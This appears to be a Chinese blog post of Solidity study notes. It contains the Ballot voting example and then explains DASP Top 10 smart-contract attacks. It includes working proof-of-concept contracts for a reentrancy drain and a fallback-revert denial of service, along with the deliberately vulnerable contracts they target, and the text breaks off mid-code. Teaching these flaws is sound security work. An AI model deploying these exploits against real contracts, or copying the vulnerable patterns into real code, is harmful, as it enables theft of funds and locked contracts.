href="https://solidity-cn.readthedocs.io/zh/develop/" target="_blank" rel="noopener">https://solidity-cn.readthedocs.io/zh/develop/</a></p></blockquote><p>remix使用教程</p><blockquote><p><a href="https://blog.csdn.net/wangdenghui2005/article/details/82865605" target="_blank" rel="noopener">https://blog.csdn.net/wangdenghui2005/article/details/82865605</a></p></blockquote><p>函数/语法，言简意赅的用法<br>版本指令/状态变量/uint/运算/结构体/数组/函数</p><blockquote><p>[一] <a href="https://www.jianshu.com/p/62fa1aaca178" target="_blank" rel="noopener">https://www.jianshu.com/p/62fa1aaca178</a><br>Keccak256/类型转换/事件<br>[二] <a href="https://www.jianshu.com/p/e3e520734965" target="_blank" rel="noopener">https://www.jianshu.com/p/e3e520734965</a><br>Addresses/mapping/Msg/Require/继承/引入<br>[三]<a href="https://www.jianshu.com/p/795e97f793a4" target="_blank" rel="noopener">https://www.jianshu.com/p/795e97f793a4</a><br>Storage/Memory/internal/external/与其他合约的交互<br>[四]<a href="https://www.jianshu.com/p/b53270cadd75" target="_blank" rel="noopener">https://www.jianshu.com/p/b53270cadd75</a><br>[五]<a href="https://www.jianshu.com/p/b5af029c6b67" target="_blank" rel="noopener">https://www.jianshu.com/p/b5af029c6b67</a><br>[六]<a href="https://www.jianshu.com/p/9a4e2c5be62b" target="_blank" rel="noopener">https://www.jianshu.com/p/9a4e2c5be62b</a><br>[七]<a href="https://www.jianshu.com/p/d7f620d23c5b" target="_blank" rel="noopener">https://www.jianshu.com/p/d7f620d23c5b</a><br>[八]<a href="https://www.jianshu.com/p/fa4e79f2a9e7" target="_blank" rel="noopener">https://www.jianshu.com/p/fa4e79f2a9e7</a><br>[九]<a href="https://www.jianshu.com/p/c23d4ec6680c" target="_blank" rel="noopener">https://www.jianshu.com/p/c23d4ec6680c</a><br>[十]<a href="https://www.jianshu.com/p/c239eccbce45" target="_blank" rel="noopener">https://www.jianshu.com/p/c239eccbce45</a><br>[十一]<a href="https://www.jianshu.com/p/26d66aa1c122" target="_blank" rel="noopener">https://www.jianshu.com/p/26d66aa1c122</a><br>[十二]<a href="https://www.jianshu.com/p/113130e1a52e" target="_blank" rel="noopener">https://www.jianshu.com/p/113130e1a52e</a></p></blockquote><h2 id="学习过程中的备忘"><a href="#学习过程中的备忘" class="headerlink" title="学习过程中的备忘"></a>学习过程中的备忘</h2><p><code>mapping (address =&gt; uint) pendingWithdrawals;</code> mapping可以看做哈希表，记录每个address情况<br><code>msg</code>为全局变量<br><code>msg.sender</code>获取调用者的address<br><code>msg.value</code>获取调用者发送的值<br><code>require</code>和<code>assert</code>为检查函数<br><code>payable</code>函数涉及调用钱包交易时，需要添加关键词</p><p><strong><address>.call(…) returns (bool)</address></strong><br>发出低级函数 CALL，失败时返回 false，发送所有可用 gas，可调节。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">address nameReg = 0x72ba7d8e73fe8eb666ea66babc8116a41bfb10e2;</span><br><span class="line">nameReg.call(<span class="string">"register"</span>, <span class="string">"MyName"</span>);</span><br><span class="line">nameReg.call(bytes4(keccak256(<span class="string">"fun(uint256)"</span>)), a);</span><br></pre></td></tr></table></figure></p><p><strong>this (current contract’s type):</strong></p><blockquote><p>当前合约，可以明确转换为 地址类型。</p></blockquote><p><strong>modifier</strong><br>    <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier onlyOwner &#123;</span><br><span class="line">   require(msg.sender == owner);</span><br><span class="line">   _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>修饰器所修饰的函数体会被插入到特殊符号 _; 的位置。</p><h2 id="记录个injected-web3连接的坑"><a href="#记录个injected-web3连接的坑" class="headerlink" title="记录个injected web3连接的坑"></a>记录个injected web3连接的坑</h2><p>firefox装完METAMASK后发现remix连不上…<br>进入user的setting<br><img src="https://i.loli.net/2019/04/22/5cbd4c175c177.jpg" alt="1.jpg"><br>选择-Security &amp; Privacy<br><img src="https://i.loli.net/2019/04/22/5cbd4c1760799.jpg" alt="2.jpg"><br>关掉-隐私模式<br><img src="https://i.loli.net/2019/04/22/5cbd4c1745278.jpg" alt="3.jpg"><br>重新刷新网页后injected web3就能连上METAMASK<br><img src="https://i.loli.net/2019/04/22/5cbd4c8aa7bb7.jpg" alt="4.jpg"></p><h2 id="例子入门"><a href="#例子入门" class="headerlink" title="例子入门"></a>例子入门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.22; //版本指令,编译版本</span><br><span class="line"></span><br><span class="line">/// @title 委托投票</span><br><span class="line">contract Ballot &#123; //</span><br><span class="line">    // 这里声明了一个新的复合类型用于稍后的变量</span><br><span class="line">    // 它用来表示一个选民</span><br><span class="line">    struct Voter &#123;</span><br><span class="line">        uint weight; // 计票的权重</span><br><span class="line">        bool voted;  // 若为真，代表该人已投票</span><br><span class="line">        address delegate; // 被委托人</span><br><span class="line">        uint vote;   // 投票提案的索引</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 提案的类型</span><br><span class="line">    struct Proposal &#123;</span><br><span class="line">        bytes32 name;   // 简称（最长32个字节）</span><br><span class="line">        uint voteCount; // 得票数</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    address public chairperson;</span><br><span class="line"></span><br><span class="line">    // 这声明了一个状态变量，为每个可能的地址存储一个 `Voter`。</span><br><span class="line">    mapping(address =&gt; Voter) public voters;</span><br><span class="line"></span><br><span class="line">    // 一个 `Proposal` 结构类型的动态数组</span><br><span class="line">    Proposal[] public proposals;</span><br><span class="line"></span><br><span class="line">    /// 为 `proposalNames` 中的每个提案，创建一个新的（投票）表决</span><br><span class="line">    constructor(bytes32[] proposalNames) public &#123;</span><br><span class="line">        chairperson = msg.sender;</span><br><span class="line">        voters[chairperson].weight = 1;</span><br><span class="line">        //对于提供的每个提案名称，</span><br><span class="line">        //创建一个新的 Proposal 对象并把它添加到数组的末尾。</span><br><span class="line">        for (uint i = 0; i &lt; proposalNames.length; i++) &#123;</span><br><span class="line">            // `Proposal(&#123;...&#125;)` 创建一个临时 Proposal 对象，</span><br><span class="line">            // `proposals.push(...)` 将其添加到 `proposals` 的末尾</span><br><span class="line">            proposals.push(Proposal(&#123;</span><br><span class="line">                name: proposalNames[i],</span><br><span class="line">                voteCount: 0</span><br><span class="line">            &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 授权 `voter` 对这个（投票）表决进行投票</span><br><span class="line">    // 只有 `chairperson` 可以调用该函数。</span><br><span class="line">    function giveRightToVote(address voter) public &#123;</span><br><span class="line">        // 若 `require` 的第一个参数的计算结果为 `false`，</span><br><span class="line">        // 则终止执行，撤销所有对状态和以太币余额的改动。</span><br><span class="line">        // 在旧版的 EVM 中这曾经会消耗所有 gas，但现在不会了。</span><br><span class="line">        // 使用 require 来检查函数是否被正确地调用，是一个好习惯。</span><br><span class="line">        // 你也可以在 require 的第二个参数中提供一个对错误情况的解释。</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == chairperson,</span><br><span class="line">            &quot;Only chairperson can give right to vote.&quot;</span><br><span class="line">        );</span><br><span class="line">        require(</span><br><span class="line">            !voters[voter].voted,</span><br><span class="line">            &quot;The voter already voted.&quot;</span><br><span class="line">        );</span><br><span class="line">        require(voters[voter].weight == 0);</span><br><span class="line">        voters[voter].weight = 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// 把你的投票委托到投票者 `to`。</span><br><span class="line">    function delegate(address to) public &#123;</span><br><span class="line">        // 传引用</span><br><span class="line">        Voter storage sender = voters[msg.sender];</span><br><span class="line">        require(!sender.voted, &quot;You already voted.&quot;);</span><br><span class="line"></span><br><span class="line">        require(to != msg.sender, &quot;Self-delegation is disallowed.&quot;);</span><br><span class="line"></span><br><span class="line">        // 委托是可以传递的，只要被委托者 `to` 也设置了委托。</span><br><span class="line">        // 一般来说，这种循环委托是危险的。因为，如果传递的链条太长，</span><br><span class="line">        // 则可能需消耗的gas要多于区块中剩余的（大于区块设置的gasLimit），</span><br><span class="line">        // 这种情况下，委托不会被执行。</span><br><span class="line">        // 而在另一些情况下，如果形成闭环，则会让合约完全卡住。</span><br><span class="line">        while (voters[to].delegate != address(0)) &#123;</span><br><span class="line">            to = voters[to].delegate;</span><br><span class="line"></span><br><span class="line">            // 不允许闭环委托</span><br><span class="line">            require(to != msg.sender, &quot;Found loop in delegation.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // `sender` 是一个引用, 相当于对 `voters[msg.sender].voted` 进行修改</span><br><span class="line">        sender.voted = true;</span><br><span class="line">        sender.delegate = to;</span><br><span class="line">        Voter storage delegate_ = voters[to];</span><br><span class="line">        if (delegate_.voted) &#123;</span><br><span class="line">            // 若被委托者已经投过票了，直接增加得票数</span><br><span class="line">            proposals[delegate_.vote].voteCount += sender.weight;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 若被委托者还没投票，增加委托者的权重</span><br><span class="line">            delegate_.weight += sender.weight;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// 把你的票(包括委托给你的票)，</span><br><span class="line">    /// 投给提案 `proposals[proposal].name`.</span><br><span class="line">    function vote(uint proposal) public &#123;</span><br><span class="line">        Voter storage sender = voters[msg.sender];</span><br><span class="line">        require(!sender.voted, &quot;Already voted.&quot;);</span><br><span class="line">        sender.voted = true;</span><br><span class="line">        sender.vote = proposal;</span><br><span class="line"></span><br><span class="line">        // 如果 `proposal` 超过了数组的范围，则会自动抛出异常，并恢复所有的改动</span><br><span class="line">        proposals[proposal].voteCount += sender.weight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @dev 结合之前所有的投票，计算出最终胜出的提案</span><br><span class="line">    function winningProposal() public view</span><br><span class="line">            returns (uint winningProposal_)</span><br><span class="line">    &#123;</span><br><span class="line">        uint winningVoteCount = 0;</span><br><span class="line">        for (uint p = 0; p &lt; proposals.length; p++) &#123;</span><br><span class="line">            if (proposals[p].voteCount &gt; winningVoteCount) &#123;</span><br><span class="line">                winningVoteCount = proposals[p].voteCount;</span><br><span class="line">                winningProposal_ = p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 调用 winningProposal() 函数以获取提案数组中获胜者的索引，并以此返回获胜者的名称</span><br><span class="line">    function winnerName() public view</span><br><span class="line">            returns (bytes32 winnerName_)</span><br><span class="line">    &#123;</span><br><span class="line">        winnerName_ = proposals[winningProposal()].name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="合约攻击-Dasp-Top10"><a href="#合约攻击-Dasp-Top10" class="headerlink" title="合约攻击 Dasp Top10"></a>合约攻击 Dasp Top10</h1><blockquote><p>语法学习: <a href="https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html" target="_blank" rel="noopener">https://solidity-cn.readthedocs.io/zh/develop/introduction-to-smart-contracts.html</a></p></blockquote><h2 id="重⼊漏洞（re-entrancy）"><a href="#重⼊漏洞（re-entrancy）" class="headerlink" title="重⼊漏洞（re-entrancy）"></a>重⼊漏洞（re-entrancy）</h2><p>也被称为 或与空⽩竞争，递归调⽤漏洞，未知调⽤</p><p>这种漏洞在很多时候被很多不同的⼈忽略：审阅者倾向于⼀次⼀个地审查函数，并且假定保护⼦例程的调⽤将安全并按预期运⾏。<br>重⼊攻击，可能是最着名的以太坊漏洞，第⼀次被发现时，每个⼈都感到惊讶。它在数百万美元的抢劫案中⾸次亮相，导致了以太坊的分叉。当初始执⾏完成之前，外部合同调⽤被允许对调⽤合同进⾏新的调⽤时，就会发⽣重新进⼊。对于函数来说，这意味着合同状态可能会在执⾏过程中因为调⽤不可信合同或使⽤具有外部地址的低级函数⽽发⽣变化。</p><h3 id="首先来了解下与重入攻击有关的几个函数"><a href="#首先来了解下与重入攻击有关的几个函数" class="headerlink" title="首先来了解下与重入攻击有关的几个函数"></a>首先来了解下与重入攻击有关的几个函数</h3><ul><li><p><strong>fallback()</strong><br>执行条件：<br>–  当合约调用中未匹配到函数，或没有带任何数据时被执行<br>–  当外部账户或其他合约向该合约地址发送 ether 时；</p></li><li><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.1;</span><br><span class="line">contract fallback&#123;</span><br><span class="line">  <span class="keyword">function</span> &#123;</span><br><span class="line">  //fallback为匿名函数，在一个合约实例中有且只有一个，没有传参与返回值</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><address>.transfer()</address></strong><br>当发送失败时会 throw; 回滚状态<br>只会传递 2300 Gas 供调用，防止重入（reentrancy）</p></li><li><p><strong><address>.send()</address></strong><br>当发送失败时会返回 false 布尔值<br>只会传递 2300 Gas 供调用，防止重入（reentrancy）</p></li><li><p><strong><address>.gas().call.value()()</address></strong><br>当发送失败时会返回 false 布尔值<br>传递所有可用 Gas 进行调用（可通过 gas(gas_value) 进行限制），不能有效防止重入（reentrancy）</p></li><li><p><strong>revert 和 throw</strong><br>revert和throw 都是标记错误并恢复当前调用 (相当于A和B交易，交易失败后每个人手上的钱ether都没有变，但是这次交易需要收取手续费Gas)</p></li></ul><p>当合约将 Ether 发送到以合约账号，会触发被发送合约的fallback函数，当攻击值在fallback函数中写入恶意调用、恶意回退时，原本合约的逻辑可能被打乱。导致任意提款、合约卡死等问题</p><h3 id="攻击的例子1-fallback函数导致的偷钱"><a href="#攻击的例子1-fallback函数导致的偷钱" class="headerlink" title="攻击的例子1: fallback函数导致的偷钱"></a>攻击的例子1: fallback函数导致的偷钱</h3><p>以下为rickgray师傅的题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.10;</span><br><span class="line"></span><br><span class="line">contract IDMoney &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    mapping (address =&gt; uint256) balances;  // 记录每个打币者存入的资产情况</span><br><span class="line"></span><br><span class="line">    event withdrawLog(address, uint256);</span><br><span class="line">    </span><br><span class="line">    function IDMoney() &#123; owner = msg.sender; &#125;</span><br><span class="line">    function deposit() payable &#123; balances[msg.sender] += msg.value; &#125;</span><br><span class="line">    function withdraw(address to, uint256 amount) &#123;</span><br><span class="line">        require(balances[msg.sender] &gt; amount);</span><br><span class="line">        require(this.balance &gt; amount);</span><br><span class="line"></span><br><span class="line">        withdrawLog(to, amount);  // 打印日志，方便观察 reentrancy</span><br><span class="line">        </span><br><span class="line">        to.call.value(amount)();  // 使用 call.value()() 进行 ether 转币时，默认会发所有的 Gas 给外部</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">    function balanceOf() returns (uint256) &#123; return balances[msg.sender]; &#125;</span><br><span class="line">    function balanceOf(address addr) returns (uint256) &#123; return balances[addr]; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="存在问题："><a href="#存在问题：" class="headerlink" title="存在问题："></a><strong>存在问题：</strong></h4><ol><li><p>当withdraw函数向外部账户发送ether时，会触发fallback (参见前文fallback触发条件2)</p></li><li><p>我们可以构造fallback函数在其里面调用withdraw</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function () payable &#123;</span><br><span class="line">    if (msg.sender == victim) &#123;</span><br><span class="line">        victim.call(bytes4(keccak256(&quot;withdraw(address,uint256)&quot;)), this, msg.value);//执行IDMoney中的withdraw函数</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>程序执行逻辑变为withdraw–&gt;fallback–&gt;withdraw–&gt;fallback的无限递归中</p></li><li><p>由于call.value（提取ether）在资产修改之前，每次递归都能提取到受害者的ether</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">to.call.value(amount)();  // 使用 call.value()() 进行 ether 转币时，默认会发所有的 Gas 给外部</span><br><span class="line">balances[msg.sender] -= amount;</span><br></pre></td></tr></table></figure></li><li><p>我们知道合约执行每条代码都需要消耗gas<br>比如send和transfer使用的gas限制在2300,执行完小段代码后:</p></li></ol><ul><li>返回参数</li><li>消耗完gas<br>此时攻击者的操作步骤有限，无法完成递归操作<br>但是<code>.gas().call.value()()</code>不同（参照前文说明）<br>此方法能调用全部gas(即：程序一直运行到消耗全部gas为止)，我们可以传入大量的gas保证程序能正常递归。最后call返回true或false，只有最后一步的错误执行会回滚。</li></ul><h4 id="攻击成立条件："><a href="#攻击成立条件：" class="headerlink" title="攻击成立条件："></a><strong>攻击成立条件：</strong></h4><ol><li>存在.gas().call.value()()，且未做gas限制</li><li>提币操作在资产修改之前</li></ol><h4 id="Poc编写："><a href="#Poc编写：" class="headerlink" title="Poc编写："></a><strong>Poc编写：</strong></h4><ol><li>输入目标合约地址</li><li>通过本合约地址向目标合约充值</li><li>提取账户金额，poc调用合约的withdraw，合约的withdraw再触发poc的fallback，构成withdraw–&gt;fallback–&gt;withdraw–&gt;fallback的循环提取</li><li>当币池被提取完后，设置selfdestruct提现回外部账户</li></ol><p>在上述思路下我们可以构造Poc：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract attack &#123;</span><br><span class="line">    address attacker;</span><br><span class="line">    address victim;</span><br><span class="line">    uint256 amount;</span><br><span class="line">    </span><br><span class="line">    function attack() payable &#123;attacker = msg.sender;&#125;</span><br><span class="line">    </span><br><span class="line">    function start(address target)  payable &#123;//被抢合约，存入value单位为ether。例：0x692a70d2e424a56d2c6c27aa97d1a86395877b3a</span><br><span class="line">        victim = target;</span><br><span class="line">        amount=msg.value;</span><br><span class="line">        victim.call.value(amount)(bytes4(keccak256(&quot;deposit()&quot;)));</span><br><span class="line">        victim.call(bytes4(keccak256(&quot;withdraw(address,uint256)&quot;)), this, amount/2);   //amount/2是为满足require(balances[msg.sender] &gt; amount);</span><br><span class="line">    &#125;</span><br><span class="line">    function () payable &#123;</span><br><span class="line">        if (msg.sender == victim) &#123;</span><br><span class="line">            victim.call(bytes4(keccak256(&quot;withdraw(address,uint256)&quot;)), this, amount/2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function stop()  &#123;</span><br><span class="line">        if (msg.sender == attacker)&#123;</span><br><span class="line">            selfdestruct(attacker); // 销毁合约</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><a href="https://remix.ethereum.org/#optimize=false&amp;version=soljson-v0.4.25+commit.59dbf8f1.js" target="_blank" rel="noopener">remix环境</a>下poc使用方式：</p><p><img src="https://i.loli.net/2019/03/12/5c8711b233704.png" alt="poc使用方式"></p><h3 id="攻击的例子2-利用fallback中触发revert导致合约卡死"><a href="#攻击的例子2-利用fallback中触发revert导致合约卡死" class="headerlink" title="攻击的例子2:利用fallback中触发revert导致合约卡死"></a>攻击的例子2:利用fallback中触发revert导致合约卡死</h3><p>此题来自solidity-cn.readthedocs.io的例子:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.11;</span><br><span class="line"></span><br><span class="line">contract SendContract &#123;</span><br><span class="line">    address public richest;</span><br><span class="line">    uint public mostSent;</span><br><span class="line"></span><br><span class="line">    function SendContract() public payable &#123;</span><br><span class="line">        richest = msg.sender;</span><br><span class="line">        mostSent = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function becomeRichest() public payable returns (bool) &#123;</span><br><span class="line">        if (msg.value &gt; mostSent) &#123;</span><br><span class="line">            // 这一行会导致问题（详见下文）</span><br><span class="line">            richest.transfer(msg.value);</span><br><span class="line">            richest = msg.sender;</span><br><span class="line">            mostSent = msg.value;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里我给出攻击poc,和例1利用类似。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract attack &#123;</span><br><span class="line">    address attacker;</span><br><span class="line">    address victim;</span><br><span class="line">    </span><br><span class="line">    function attack() &#123;attacker=msg.sender;&#125;</span><br><span class="line">    function start(address target) payable &#123;</span><br><span class="line">        victim = target;</span><br><span class="line">        victim.call.value(msg.value)(bytes4(keccak256(&quot;becomeRichest()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function () payable &#123;</span><br><span class="line">        if (msg.sender == victim)&#123;</span><br><span class="line">            revert(); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function  destroy() &#123;</span><br><span class="line">        if (msg.sender == attacker)&#123;</span><br><span class="line">            selfdestruct(attacker);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>其中的逻辑：</strong></p><ul><li>输入ether大于合约中最大值<br><code>msg.value &gt; mostSent</code><br>使attack合约成为richest，</li><li><p>只要别人想成为richest就会触发<br><code>richest.transfer(msg.value);</code><br>调用attack中的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function () payable &#123;</span><br><span class="line">    if (msg.sender == victim)&#123;</span><br><span class="line">        revert(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>执行回滚，防止别人成为richest</p></li></ul><hr><h2 id="访问控制（Access-Control）"><a href="#访问控制（Access-Control）" class="headerlink" title="访问控制（Access Control）"></a>访问控制（Access Control）</h2><p>CALL 与 DELEGATECALL 操作非常有用，它们让 Ethereum 合约的开发者将他们的代码模块化（Modularise）。用 CALL 操作码来处理对合约的外部标准信息调用（Standard Message Call）时，代码在外部合约/功能的环境中运行。 DELEGATECALL 操作码也是标准消息调用，但在目标地址中的代码会在调用合约的环境下运行，也就是说，保持 msg.sender 和 msg.value 不变。该功能支持实现库，开发人员可以为未来的合约创建可重用的代码。<br>但是使用 DELEGATECALL 可能会导致意外的代码执行。因为他在被调用的时候会保存当前合约中的属性。</p><h3 id="首先来了解下几个相关函数"><a href="#首先来了解下几个相关函数" class="headerlink" title="首先来了解下几个相关函数"></a>首先来了解下几个相关函数</h3><ul><li><strong><address>.call(…) returns (bool)</address></strong><br>发出低级函数 CALL，失败时返回 false，发送所有可用 gas，可调节。<br>call包含下列七个参数<br><strong>call(gas, address, value, in, insize, out, outsize)</strong>：<br>– 第一个参数是指定的gas限制，如果不指定该参数，默认不限制。<br>– 第二个参数是接收转账的地址<br>– 第三个参数是转账的金额<br>– 第四个参数是输入给call指令的数据在memory中的起始地址<br>– 第五个参数是输入的数据的长度<br>– 第六个参数是call指令输出的数据在memory中的起始地址<br>– 第七个参数是call指令输出的数据的长度</li></ul><ul><li><strong><address>.delegatecall(…) returns (bool)</address></strong><br>发出低级函数 DELEGATECALL，失败时返回 false，发送所有可用 gas，可调节。</li></ul><p>delegatecall与call两者的用法和性质相似,唯一区别就在于：前者<strong>当前合约</strong>里运行，后者在<strong>被调用合约</strong>里运行</p><p>两者区别，图表理解：<br><img src="https://i.loli.net/2019/03/12/5c8768d94dc21.png" alt="7.png"><br>合约 A 以 call 方式调用外部合约 B 的 func() 函数，在外部合约 B 上下文执行完 func() 后继续返回 A 合约上下文继续执行；而当 A 以 delegatecall 方式调用时，相当于将外部合约 B 的 func() 代码复制过来（其函数中涉及的变量或函数都需要存在）在 A 上下文空间中执行。</p><h3 id="攻击例子1：当calldata可控"><a href="#攻击例子1：当calldata可控" class="headerlink" title="攻击例子1：当calldata可控"></a>攻击例子1：当calldata可控</h3><p>来自安全客中的一个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 